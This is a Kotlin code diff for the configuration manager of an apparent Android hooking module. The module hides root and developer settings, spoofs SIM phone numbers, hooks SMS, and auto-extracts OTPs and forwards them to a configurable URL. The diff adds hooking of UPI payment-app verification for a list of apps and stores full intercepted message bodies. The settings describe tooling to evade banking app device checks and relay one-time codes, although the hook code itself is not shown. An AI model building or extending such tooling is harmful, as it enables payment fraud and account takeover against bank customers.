@@ -20,6 +20,8 @@ data class ModuleConfig(
     val mockPhoneSim2: String = "+919876543211",
     val hookIncomingSms: Boolean = true,
     val hookOutgoingSms: Boolean = true,
+    val hookUpiVerification: Boolean = true,
+    val hookedUpiApps: Map<String, Boolean> = UpiAppRegistry.defaultHookMap(),
     val autoExtractOtp: Boolean = true,
     val autoForwardToken: Boolean = true,
     val forwardUrl: String = "",
@@ -33,8 +35,10 @@ data class ModuleConfig(
 data class LastOtp(
     val otp: String,
     val sender: String,
-    val direction: String = "incoming",
-    val phone: String = ""
+    val body: String = "",
+    val phone: String = "",
+    val messageLabel: String = "",
+    val direction: String = "incoming"
 )
 
 class ConfigManager(private val context: Context) {
@@ -71,6 +75,8 @@ class ConfigManager(private val context: Context) {
                 mockPhoneSim2 = json.optString("mock_phone_sim2", "+919876543211"),
                 hookIncomingSms = json.optBoolean("hook_incoming_sms", true),
                 hookOutgoingSms = json.optBoolean("hook_outgoing_sms", true),
+                hookUpiVerification = json.optBoolean("hook_upi_verification", true),
+                hookedUpiApps = parseHookedApps(json),
                 autoExtractOtp = json.optBoolean("auto_extract_otp", true),
                 autoForwardToken = json.optBoolean("auto_forward_token", true),
                 forwardUrl = json.optString("forward_url", ""),
@@ -85,7 +91,20 @@ class ConfigManager(private val context: Context) {
         }
     }
 
+    private fun parseHookedApps(json: JSONObject): Map<String, Boolean> {
+        if (!json.has("hooked_upi_apps")) return UpiAppRegistry.defaultHookMap()
+        val obj = json.getJSONObject("hooked_upi_apps")
+        val result = mutableMapOf<String, Boolean>()
+        UpiAppRegistry.ALL.forEach { app ->
+            result[app.packageName] = obj.optBoolean(app.packageName, true)
+        }
+        return result
+    }
+
     fun save(config: ModuleConfig) {
+        val hookedJson = JSONObject()
+        config.hookedUpiApps.forEach { (pkg, enabled) -> hookedJson.put(pkg, enabled) }
+
         val json = JSONObject().apply {
             put("hide_root", config.hideRoot)
             put("hide_developer", config.hideDeveloper)
@@ -102,6 +121,8 @@ class ConfigManager(private val context: Context) {
             put("mock_phone_sim2", config.mockPhoneSim2)
             put("hook_incoming_sms", config.hookIncomingSms)
             put("hook_outgoing_sms", config.hookOutgoingSms)
+            put("hook_upi_verification", config.hookUpiVerification)
+            put("hooked_upi_apps", hookedJson)
             put("auto_extract_otp", config.autoExtractOtp)
             put("auto_forward_token", config.autoForwardToken)
             put("forward_url", config.forwardUrl)
@@ -151,10 +172,12 @@ class ConfigManager(private val context: Context) {
         return try {
             val json = JSONObject(lastOtpFile.readText())
             LastOtp(
-                otp = json.getString("otp"),
-                sender = json.getString("sender"),
-                direction = json.optString("direction", "incoming"),
-                phone = json.optString("phone", readSpoofPhone())
+                otp = json.optString("otp", ""),
+                sender = json.optString("sender", ""),
+                body = json.optString("body", ""),
+                phone = json.optString("phone", readSpoofPhone()),
+                messageLabel = json.optString("message_label", ""),
+                direction = json.optString("direction", "incoming")
             )
         } catch (_: Exception) {
             null
